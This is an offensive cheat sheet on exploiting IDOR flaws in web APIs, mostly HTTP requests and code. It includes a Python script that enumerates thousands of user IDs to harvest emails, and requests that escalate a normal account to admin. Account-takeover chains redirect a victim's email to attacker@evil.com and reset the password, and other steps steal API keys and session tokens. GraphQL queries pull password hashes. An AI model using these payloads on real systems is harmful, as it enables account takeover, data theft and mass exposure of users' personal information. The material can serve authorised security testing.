# Exploiting IDORs

## Horizontal IDOR

Access another user's data at the same privilege level.

```http
# Your request
GET /api/users/123/profile
Authorization: Bearer your_token

# Attack - change ID
GET /api/users/124/profile
Authorization: Bearer your_token
```

### Mass Enumeration

```python
import requests

token = "your_jwt_here"
headers = {"Authorization": f"Bearer {token}"}

for user_id in range(1, 10000):
    r = requests.get(f"https://target.com/api/users/{user_id}", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"{user_id}: {data.get('email', 'N/A')}")
```

## Vertical IDOR

Access admin functions as regular user.

```http
# Normal user hitting admin endpoint
POST /api/admin/users
Authorization: Bearer normal_user_token
Content-Type: application/json

{"action": "delete", "target_id": 999}
```

### Role Manipulation

```json
PUT /api/users/me
{
  "roles": ["user", "admin"],
  "is_admin": true
}
```

## Account Takeover Chains

### 1. Email Change → Password Reset

```http
# Step 1: Change victim's email to yours
PUT /api/users/124/settings
{"email": "attacker@evil.com"}

# Step 2: Password reset to your email
POST /reset-password
{"email": "attacker@evil.com"}
```

### 2. API Key Theft

```http
GET /api/users/124/api-keys
→ {"key": "sk_live_xxx"}

# Use stolen key
curl -H "X-API-Key: sk_live_xxx" https://target.com/api/...
```

### 3. Session Hijack

```http
# Some apps expose session tokens
GET /api/users/124/sessions
→ {"active_sessions": [{"token": "eyJhbG..."}]}
```

## GraphQL IDOR

```graphql
query {
  user(id: "124") {  # Not your ID
    email
    password_hash
    api_keys
  }
}

# Nested object access
query {
  project(id: "1") {
    members {
      user { email, phone }
    }
  }
}
```

## Blind IDOR

No direct data returned, but actions succeed.

```http
# Delete works even without confirmation
DELETE /api/files/999
→ 204 No Content

# Verify by trying to access
GET /api/files/999
→ 404 Not Found
```
